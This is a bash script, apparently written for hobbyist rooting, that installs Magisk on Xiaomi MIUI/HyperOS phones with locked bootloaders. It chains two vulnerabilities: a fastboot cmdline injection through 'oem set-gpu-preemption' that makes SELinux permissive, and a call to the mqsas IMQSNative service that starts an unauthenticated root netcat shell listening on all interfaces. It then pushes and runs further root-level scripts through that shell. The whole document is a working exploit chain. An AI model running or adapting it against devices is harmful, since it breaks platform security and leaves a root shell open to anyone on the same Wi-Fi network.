#!/bin/bash
# magisk on locked bootloader via qcom fastboot cmdline injection + mqsas root, tested on miui/hyperos devices vulnerable to fastboot oem set-gpu-preemption + mqsas IMQSNative - made with claude AI and a lot of bugfixing
# Credits - Magisk:https://github.com/topjohnwu/Magisk - Init mount namespace fix:https://github.com/polygraphene/DirtyPipe-Android/blob/master/startup-root - j4nn @ xda for the original Magisk-on-exploit concept (v20.4):https://github.com/j4nn

DEVICE_TMP="/data/local/tmp"
MAGISK_VER="30.7"
MAGISK_APK="Magisk-v${MAGISK_VER}.apk"
MAGISK_URL="https://github.com/topjohnwu/Magisk/releases/download/v${MAGISK_VER}/${MAGISK_APK}"
TMP_DIR="/tmp"
NC_PORT=1234

safe_exit() {
    (return 0 2>/dev/null) && return "$1" || exit "$1"
}

log() { echo "[*] $1"; }
err() { echo "[!] $1"; }

# send a command to the root shell listener and wait for output
rsh() {
    echo "$@" | nc -w 3 "$IP" "$NC_PORT" 2>/dev/null
}

# ── dependency checks ─────────────────────────────────────────────────────────
for cmd in wget adb fastboot unzip nc aarch64-linux-gnu-gcc arm-none-eabi-gcc; do
    if ! command -v "$cmd" &>/dev/null; then
        err "$cmd is not installed. Please install it to use this script."
        exit 1
    fi
done
log "all dependencies found"

GET_ARCH=$(adb shell 'getprop ro.product.cpu.abi')
if [ "$GET_ARCH" = "arm64-v8a" ]; then
ARCH=64
else
ARCH=32
fi

# ── download magisk apk if not already present ────────────────────────────────
if [ ! -f "$TMP_DIR/$MAGISK_APK" ]; then
    log "downloading $MAGISK_APK..."
    wget -O "$TMP_DIR/$MAGISK_APK" "$MAGISK_URL" 2>/dev/null
    if [ $? -ne 0 ] || [ ! -f "$TMP_DIR/$MAGISK_APK" ]; then
        err "download failed"
        exit 1
    fi
    log "download complete"
else
    log "$MAGISK_APK already present, skipping download"
fi

# ── 1. wait for device ────────────────────────────────────────────────────────
log "waiting for adb..."
adb wait-for-device

# ── 2. uninstall miui ota updates app ────────────────────────────────────────
miuiupdateuni(){
log "uninstalling miui ota updates app..."
adb shell "pm uninstall --user 0 com.android.updater"
}
if [ "$(adb shell 'pm list packages | grep com.android.updater')" != package:com.android.updater ]; then
log "miui ota updates app already uninstalled, skipping..."
else
miuiupdateuni
fi

# ── 3. fastboot step if selinux is enforcing ──────────────────────────────────
selinux=$(adb shell getprop ro.boot.selinux | tr -d '\r')
if [ "$selinux" != "permissive" ]; then
    log "selinux is enforcing, doing cmdline injection..."
    adb reboot bootloader
    until fastboot devices | grep -q fastboot; do sleep 1; done
    fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
    fastboot continue

    log "waiting for adb..."
    adb wait-for-device
    log "waiting for android boot..."
    until adb shell getprop sys.boot_completed 2>/dev/null | grep -q 1; do sleep 1; done
    log "waiting for /data..."
    until adb shell '[ -d /data/data ]' 2>/dev/null; do sleep 1; done

    selinux=$(adb shell getprop ro.boot.selinux | tr -d '\r')
    if [ "$selinux" != "permissive" ]; then
        err "selinux still enforcing after cmdline injection - aborting"
        safe_exit 1
    fi

# ── 4. check wifi and get device IP ──────────────────────────────────────────
    log "checking wifi..."
    adb shell "sleep 10"
    IP=$(adb shell ip addr show wlan0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1 | tr -d '\r')
    if [ -z "$IP" ] || [ "$IP" = "127.0.0.1" ]; then
    err "device not connected to wifi - connect to a wifi network and retry"
    safe_exit 1
    fi
    log "device IP: $IP"

    log "running root shell listener..."
    adb shell "/system/bin/service call miui.mqsas.IMQSNative 21 \
        i32 1 s16 'toybox' i32 1 \
        s16 'nc -s 0.0.0.0 -p $NC_PORT -L sh -l' \
        s16 '$DEVICE_TMP/listener.log' i32 600" &
    sleep 3
    rsh "id" | grep -q "uid=0" || { err "root listener failed after reboot"; safe_exit 1; }
    log "root shell listener running"
else
    log "selinux is permissive, skipping cmdline step"
fi

# ── 5. extract and push binaries ──────────────────────────────────────────────
log "pushing magisk binaries..."

TMPDIR=$(mktemp -d)
trap 'rm -rf "$TMPDIR"' EXIT

unzip -o "$TMP_DIR/$MAGISK_APK" \
    "lib/arm64-v8a/*.so" \
    "assets/stub.apk" \
    "assets/*.sh" \
    "assets/chromeos/*" \
    -d "$TMPDIR" >/dev/null 2>&1

if [ $? -ne 0 ]; then
    err "failed to extract binaries from apk"
    safe_exit 1
fi

cp "$TMPDIR/lib/arm64-v8a/libbusybox.so"      "$TMPDIR/busybox"
cp "$TMPDIR/lib/arm64-v8a/libinit-ld.so"   "$TMPDIR/init-ld"
cp "$TMPDIR/lib/arm64-v8a/libmagisk.so"       "$TMPDIR/magisk"
cp "$TMPDIR/lib/arm64-v8a/libmagisk.so"       "$TMPDIR/magisk$ARCH"
cp "$TMPDIR/lib/arm64-v8a/libmagiskboot.so"   "$TMPDIR/magiskboot"
cp "$TMPDIR/lib/arm64-v8a/libmagiskinit.so" "$TMPDIR/magiskinit"
cp "$TMPDIR/lib/arm64-v8a/libmagiskpolicy.so" "$TMPDIR/magiskpolicy"

adb push "$TMPDIR/busybox"              "$DEVICE_TMP/busybox"
adb push "$TMPDIR/init-ld"              "$DEVICE_TMP/init-ld"
adb push "$TMPDIR/magisk"               "$DEVICE_TMP/magisk"
adb push "$TMPDIR/magisk$ARCH"             "$DEVICE_TMP/magisk$ARCH"
adb push "$TMPDIR/magiskboot"           "$DEVICE_TMP/magiskboot"
adb push "$TMPDIR/magiskinit"           "$DEVICE_TMP/magiskinit"
adb push "$TMPDIR/magiskpolicy"         "$DEVICE_TMP/magiskpolicy"
adb push "$TMPDIR/assets/stub.apk"     "$DEVICE_TMP/stub.apk"
adb push "$TMPDIR/assets/addon.d.sh"     "$DEVICE_TMP/addon.d.sh"
adb push "$TMPDIR/assets/boot_patch.sh"     "$DEVICE_TMP/boot_patch.sh"
adb push "$TMPDIR/assets/util_functions.sh"     "$DEVICE_TMP/util_functions.sh"
adb push "$TMPDIR/assets/chromeos"             "$DEVICE_TMP/chromeos"

# ── 6. write magisk_setup.sh onto device ─────────────────────────────────────
log "writing magisk_setup.sh to device..."
adb shell "cat > $DEVICE_TMP/magisk_setup.sh" << 'EOF'
#!/system/bin/sh
DEVICE_TMP="/data/local/tmp"
MAGISKBIN="/data/adb/magisk"

# switch to su context within this process
echo "u:r:su:s0" > /proc/self/attr/current

echo "=== magisk setup ==="
echo "running as: $(id)"
echo "selinux context: $(cat /proc/self/attr/current 2>/dev/null)"

GET_ARCH=$(getprop ro.product.cpu.abi)
if [ "$GET_ARCH" = "arm64-v8a" ]; then
ARCH=64
else
ARCH=32
fi

mkdir -p "$MAGISKBIN" /data/adb/modules /data/adb/post-fs-data.d /data/adb/service.d /data/adb/modules_update
cp -R "$DEVICE_TMP/chromeos" "$MAGISKBIN/"

echo "deploying binaries..."
for f in addon.d.sh boot_patch.sh busybox init-ld magisk magisk$ARCH magiskboot magiskinit magiskpolicy stub.apk util_functions.sh; do
    if [ ! -f "$DEVICE_TMP/$f" ]; then
        echo "MISSING: $DEVICE_TMP/$f"; exit 1
    fi
    cp -R "$DEVICE_TMP/$f" "$MAGISKBIN/$f"
done

chcon -R u:object_r:magisk_file:s0 "$MAGISKBIN" || \
    chcon -R u:object_r:system_data_file:s0 "$MAGISKBIN"

cat > "$MAGISKBIN/config" << 'EOFCFG'
KEEPVERITY=true
KEEPFORCEENCRYPT=true
EOFCFG
chmod 600 "$MAGISKBIN/config"
chmod 755 -R /data/adb
chmod 700 /data/adb
chown -R root:root /data/adb

ls -la "$MAGISKBIN/"
echo "SETUP_DONE"
EOF

# ── 7. write magisk_start.sh onto device ─────────────────────────────────────
log "writing magisk_start.sh to device..."
adb shell "cat > $DEVICE_TMP/magisk_start.sh" << 'EOF'
#!/system/bin/sh
MAGISKBIN="/data/adb/magisk"
MAGISKTMP="/debug_ramdisk"
DEVICE_TMP="/data/local/tmp"

# switch to su context within this process
echo "u:r:su:s0" > /proc/self/attr/current

echo "=== magisk start ==="
echo "running as: $(id)"
echo "context: $(cat /proc/self/attr/current 2>/dev/null)"
echo "kernel: $(uname -r)"

# BOOTCLASSPATH is required for magiskd (replace it according to your device one)
# Credit:https://github.com/polygraphene/DirtyPipe-Android/blob/master/startup-root
    export ANDROID_DATA=/data
    export ANDROID_ART_ROOT=/apex/com.android.art
    export ANDROID_TZDATA_ROOT=/apex/com.android.tzdata
    export SYSTEMSERVERCLASSPATH=/system/framework/com.android.location.provider.jar:/system/framework/services.jar:/system_ext/framework/miui-services.jar:/system_ext/framework/apprecovery.proinstaller.jar:/apex/com.android.adservices/javalib/service-adservices.jar:/apex/com.android.adservices/javalib/service-sdksandbox.jar:/apex/com.android.appsearch/javalib/service-appsearch.jar:/apex/com.android.art/javalib/service-art.jar:/apex/com.android.compos/javalib/service-compos.jar:/apex/com.android.configinfrastructure/javalib/service-configinfrastructure.jar:/apex/com.android.healthfitness/javalib/service-healthfitness.jar:/apex/com.android.media/javalib/service-media-s.jar:/apex/com.android.ondevicepersonalization/javalib/service-ondevicepersonalization.jar:/apex/com.android.permission/javalib/service-permission.jar:/apex/com.android.rkpd/javalib/service-rkp.jar:/apex/com.android.virt/javalib/service-virtualization.jar
    export ANDROID_STORAGE=/storage
    export EXTERNAL_STORAGE=/sdcard
    export DOWNLOAD_CACHE=/data/cache
    export ANDROID_ASSETS=/system/app
    export STANDALONE_SYSTEMSERVER_JARS=/apex/com.android.btservices/javalib/service-bluetooth.jar:/apex/com.android.devicelock/javalib/service-devicelock.jar:/apex/com.android.os.statsd/javalib/service-statsd.jar:/apex/com.android.profiling/javalib/service-profiling.jar:/apex/com.android.scheduling/javalib/service-scheduling.jar:/apex/com.android.tethering/javalib/service-connectivity.jar:/apex/com.android.uwb/javalib/service-uwb.jar:/apex/com.android.wifi/javalib/service-wifi.jar
    export DEX2OATBOOTCLASSPATH=/apex/com.android.art/javalib/core-oj.jar:/apex/com.android.art/javalib/core-libart.jar:/apex/com.android.art/javalib/okhttp.jar:/apex/com.android.art/javalib/bouncycastle.jar:/apex/com.android.art/javalib/apache-xml.jar:/system/framework/framework.jar:/system/framework/framework-graphics.jar:/system/framework/framework-location.jar:/system/framework/ext.jar:/system/framework/telephony-common.jar:/system/framework/voip-common.jar:/system/framework/ims-common.jar:/system/framework/tcmiface.jar:/system/framework/telephony-ext.jar:/system/framework/QPerformance.jar:/system/framework/UxPerformance.jar:/system/framework/WfdCommon.jar:/system_ext/framework/miui-framework.jar:/system_ext/framework/miui-telephony-common.jar:/system_ext/framework/miui-enterprise-sdk.jar:/system_ext/framework/vendor.xiaomi.hardware.videoservice-V4-java.jar:/apex/com.android.i18n/javalib/core-icu4j.jar
    export BOOTCLASSPATH=/apex/com.android.art/javalib/core-oj.jar:/apex/com.android.art/javalib/core-libart.jar:/apex/com.android.art/javalib/okhttp.jar:/apex/com.android.art/javalib/bouncycastle.jar:/apex/com.android.art/javalib/apache-xml.jar:/system/framework/framework.jar:/system/framework/framework-graphics.jar:/system/framework/framework-location.jar:/system/framework/ext.jar:/system/framework/telephony-common.jar:/system/framework/voip-common.jar:/system/framework/ims-common.jar:/system/framework/tcmiface.jar:/system/framework/telephony-ext.jar:/system/framework/QPerformance.jar:/system/framework/UxPerformance.jar:/system/framework/WfdCommon.jar:/system_ext/framework/miui-framework.jar:/system_ext/framework/miui-telephony-common.jar:/system_ext/framework/miui-enterprise-sdk.jar:/system_ext/framework/vendor.xiaomi.hardware.videoservice-V4-java.jar:/apex/com.android.i18n/javalib/core-icu4j.jar:/apex/com.android.adservices/javalib/framework-adservices.jar:/apex/com.android.adservices/javalib/framework-sdksandbox.jar:/apex/com.android.appsearch/javalib/framework-appsearch.jar:/apex/com.android.btservices/javalib/framework-bluetooth.jar:/apex/com.android.configinfrastructure/javalib/framework-configinfrastructure.jar:/apex/com.android.conscrypt/javalib/conscrypt.jar:/apex/com.android.devicelock/javalib/framework-devicelock.jar:/apex/com.android.healthfitness/javalib/framework-healthfitness.jar:/apex/com.android.ipsec/javalib/android.net.ipsec.ike.jar:/apex/com.android.media/javalib/updatable-media.jar:/apex/com.android.mediaprovider/javalib/framework-mediaprovider.jar:/apex/com.android.mediaprovider/javalib/framework-pdf.jar:/apex/com.android.mediaprovider/javalib/framework-pdf-v.jar:/apex/com.android.mediaprovider/javalib/framework-photopicker.jar:/apex/com.android.nfcservices/javalib/framework-nfc.jar:/apex/com.android.ondevicepersonalization/javalib/framework-ondevicepersonalization.jar:/apex/com.android.os.statsd/javalib/framework-statsd.jar:/apex/com.android.permission/javalib/framework-permission.jar:/apex/com.android.permission/javalib/framework-permission-s.jar:/apex/com.android.profiling/javalib/framework-profiling.jar:/apex/com.android.scheduling/javalib/framework-scheduling.jar:/apex/com.android.sdkext/javalib/framework-sdkextensions.jar:/apex/com.android.tethering/javalib/framework-connectivity.jar:/apex/com.android.tethering/javalib/framework-connectivity-t.jar:/apex/com.android.tethering/javalib/framework-tethering.jar:/apex/com.android.uwb/javalib/framework-uwb.jar:/apex/com.android.virt/javalib/framework-virtualization.jar:/apex/com.android.wifi/javalib/framework-wifi.jar
    export SHELL=/bin/sh
    export ANDROID_SOCKET_adbd=31
    export TERM=xterm-256color
    export ANDROID_BOOTLOGO=1
    export ASEC_MOUNTPOINT=/mnt/asec
    export TMPDIR=/data/local/tmp
    export ANDROID_ROOT=/system
    export ANDROID_I18N_ROOT=/apex/com.android.i18n
    export USER=root
    export HOSTNAME=spring
    export PATH=/data/local/tmp:/tmp:/dev/.magisk:/debug_ramdisk:/data/adb/magisk:/product/bin:/apex/com.android.runtime/bin:/apex/com.android.art/bin:/system_ext/bin:/system/bin:/system/xbin:/odm/bin:/vendor/bin:/vendor/xbin
    export HOME=/

GET_ARCH=$(getprop ro.product.cpu.abi)
if [ "$GET_ARCH" = "arm64-v8a" ]; then
ARCH=64
else
ARCH=32
fi

[ ! -f "$MAGISKBIN/magisk$ARCH" ] && { echo "magisk$ARCH not found"; exit 1; }

# kill stale instances and clean socket
if pidof magiskd > /dev/null 2>&1; then
    echo "killing stale magiskd: $(pidof magiskd)"
    kill -9 $(pidof magiskd) 2>/dev/null
    sleep 1
fi
rm -f "$MAGISKTMP/.magisk/device/.socket" /dev/.magisk.sock 2>/dev/null

echo "=== mounting MAGISKTMP ==="
mkdir -p "$MAGISKTMP"
if ! grep -q " $MAGISKTMP " /proc/mounts; then
    mount -t tmpfs -o mode=755 magisk "$MAGISKTMP" || { echo "tmpfs mount failed"; exit 1; }
fi
chcon u:object_r:magisk_file:s0 "$MAGISKTMP" 2>/dev/null
echo "mounted: $MAGISKTMP"

echo "=== building directory structure ==="
mkdir -p "$MAGISKTMP/.magisk/busybox" "$MAGISKTMP/.magisk/mirror" \
         "$MAGISKTMP/.magisk/block" "$MAGISKTMP/.magisk/modules" \
         "$MAGISKTMP/.magisk/device"

chmod 755 -R "$MAGISKTMP/.magisk"
chmod 000 "$MAGISKTMP/.magisk/mirror" "$MAGISKTMP/.magisk/block"

cp "$MAGISKBIN/config" "$MAGISKTMP/.magisk/config" 2>/dev/null
chmod 600 "$MAGISKTMP/.magisk/config"
chcon -R u:object_r:magisk_file:s0 "$MAGISKTMP/.magisk" 2>/dev/null

echo "copying binaries..."
for f in addon.d.sh boot_patch.sh busybox init-ld magisk magisk$ARCH magiskboot magiskinit magiskpolicy stub.apk util_functions.sh; do
    cp "$MAGISKBIN/$f" "$MAGISKTMP/$f" 2>/dev/null
    chmod 755 "$MAGISKTMP/$f"
done

"$MAGISKTMP/busybox" --install -s "$MAGISKTMP/.magisk/busybox" 2>/dev/null
chcon u:object_r:magisk_file:s0 "$MAGISKTMP/.magisk/busybox/busybox" 2>/dev/null

# Avoid error: 'CANNOT LINK EXECUTABLE "/system/bin/app_process64": library "libnativeloader.so" not found: needed by main executable' by entering init mount namespace once
# Credit:https://github.com/polygraphene/DirtyPipe-Android/blob/master/startup-root
if [ "$1" != "magisk" ]; then
    echo "fixing libnativeloader.so (entering init mount namespace)"
    SCRIPT=$(readlink -f "$0")
    exec "$MAGISKBIN/busybox" nsenter -t 1 -m "$SCRIPT" magisk \
        > "$DEVICE_TMP/libnativeloader_fix.log" 2>&1 < /dev/null
fi

echo "=== loading sepolicy ==="
"$MAGISKBIN/magiskpolicy" --live --magisk "allow dumpstate * * *" 2>&1 | head -5
"$MAGISKBIN/magiskpolicy" --magisk --live

echo "=== starting magiskd ==="
echo "magisk tmpfs path: $("$MAGISKTMP/magisk" --path 2>&1)"

"$MAGISKTMP/magisk" --daemon > /data/local/tmp/magiskd_direct.txt 2>&1 &
i=0
while [ $i -lt 10 ]; do
    MAGISKD_PID=$(pidof magiskd)
    [ -n "$MAGISKD_PID" ] && break
    sleep 1; i=$((i+1))
done

cat /data/local/tmp/magiskd_direct.txt 2>/dev/null
logcat -d -s Magisk 2>/dev/null | tail -10

[ -z "$MAGISKD_PID" ] && { echo "DAEMON_FAILED"; exit 1; }
echo "magiskd started: pid $MAGISKD_PID"

"$MAGISKTMP/magisk" --restorecon

echo "=== running boot stages ==="
"$MAGISKTMP/magisk$ARCH" --post-fs-data
sleep 5
"$MAGISKTMP/magisk$ARCH" --service
sleep 5
"$MAGISKTMP/magisk$ARCH" --boot-complete
echo "boot stages done"

echo "=== final status ==="
echo "magiskd pid: $(pidof magiskd 2>/dev/null || echo 'not running')"
grep -E "magisk|/debug_ramdisk" /proc/mounts 2>/dev/null
echo "ALL_DONE"
EOF

rsh "chmod 755 $DEVICE_TMP/magisk_setup.sh $DEVICE_TMP/magisk_start.sh"

# ── 8. push apk if manager not already installed ──────────────────────────────
if ! adb shell 'pm path com.topjohnwu.magisk' 2>/dev/null | grep -q package; then
    log "pushing magisk manager apk..."
    adb push "$TMP_DIR/$MAGISK_APK" "$DEVICE_TMP/magisk.apk"
else
    log "magisk manager already installed, skipping apk push"
fi
rm -f "$TMP_DIR/$MAGISK_APK"

# ── 9. run setup ─────────────────────────────────────────────────────────────
if adb shell "[ -f $DEVICE_TMP/magisk_setup.log ]" 2>/dev/null && \
   adb shell cat "$DEVICE_TMP/magisk_setup.log" 2>/dev/null | grep -q "SETUP_DONE"; then
    log "magisk already deployed, skipping setup"
else
    log "running magisk setup..."
    rsh "sh $DEVICE_TMP/magisk_setup.sh > $DEVICE_TMP/magisk_setup.log 2>&1"
    sleep 1
    rsh "chown shell:shell $DEVICE_TMP/*.log"
    log "setup output:"
    adb shell cat "$DEVICE_TMP/magisk_setup.log"
    if ! adb shell cat "$DEVICE_TMP/magisk_setup.log" | grep -q "SETUP_DONE"; then
        err "setup failed"
        safe_exit 1
    fi
    log "setup ok"
fi

# ── 10. start magisk daemon ────────────────────────────────────────────────────
log "starting magisk daemon..."
rsh "sh $DEVICE_TMP/magisk_start.sh > $DEVICE_TMP/magisk_start.log 2>&1"
sleep 3
rsh "chown shell:shell $DEVICE_TMP/*.log"
log "start output:"
adb shell cat "$DEVICE_TMP/magisk_start.log"

# ── 11. verify daemon is running ──────────────────────────────────────────────
MAGISKD=$(adb shell pidof magiskd 2>/dev/null | tr -d '\r')
if [ -n "$MAGISKD" ]; then
    log "magiskd is running (pid $MAGISKD)"
else
    err "magiskd not found - check start log above"
fi

# ── 12. install magisk manager apk ───────────────────────────────────────────
if adb shell "[ -f $DEVICE_TMP/magisk.apk ]" 2>/dev/null; then
    log "installing magisk manager..."
    rsh "pm install -r $DEVICE_TMP/magisk.apk > $DEVICE_TMP/manager_install.log 2>&1"
    sleep 1
    rsh "chown shell:shell $DEVICE_TMP/*.log"
    adb shell cat "$DEVICE_TMP/manager_install.log"
else
    log "magisk manager already installed, skipping"
fi

log "deploying su_grant.sh, use it to auth apps and shell..."
# notes: seems you can't auth com.android.shell, but you can ask root for other apps, you can run the script on /sdcard sourcing it from a terminal app to auth apps on the phone, auth first a terminal app to auth other apps with it
cat > $(pwd)/su_grant.sh <<'OUTER'
#!/bin/bash
NC_PORT=1234
IP=$(adb shell ip addr show wlan0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1 | tr -d '\r')
rsh() {
    echo "$@" | nc -w 3 "$IP" "$NC_PORT" 2>/dev/null
}
echo "input the package to grant su: "
read PACKAGE
APP_UID=$(adb shell dumpsys package $PACKAGE | grep appId | cut -d= -f2)
adb shell "cat > /data/local/tmp/su_grant.sh" <<EOF_REMOTE
#!/system/bin/sh
echo "running su_grant.sh from /data/local/tmp for $PACKAGE with $APP_UID"
echo "u:r:su:s0" > /proc/self/attr/current
/product/bin/magisk --sqlite "INSERT OR REPLACE INTO policies (uid,policy,until,logging,notification) VALUES($APP_UID,2,0,0,0);"
EOF_REMOTE

adb shell "cat > /sdcard/Documents/su_grant.sh" <<'EOF_PHONE'
#!/system/bin/sh
echo "u:r:su:s0" > /proc/self/attr/current
echo "input the package to grant su: "
read -r PACKAGE
APP_UID=$(/system/bin/dumpsys package $PACKAGE | grep appId | cut -d= -f2)
echo "running su_grant.sh from /sdcard/Documents for $PACKAGE with $APP_UID"
/product/bin/magisk --sqlite "INSERT OR REPLACE INTO policies (uid,policy,until,logging,notification) VALUES($APP_UID,2,0,0,0);"
EOF_PHONE

adb shell "chmod 777 /data/local/tmp/su_grant.sh"
rsh "sh /data/local/tmp/su_grant.sh"
OUTER
chmod +x $(pwd)/su_grant.sh
log "process is now complete, you can now use root..."
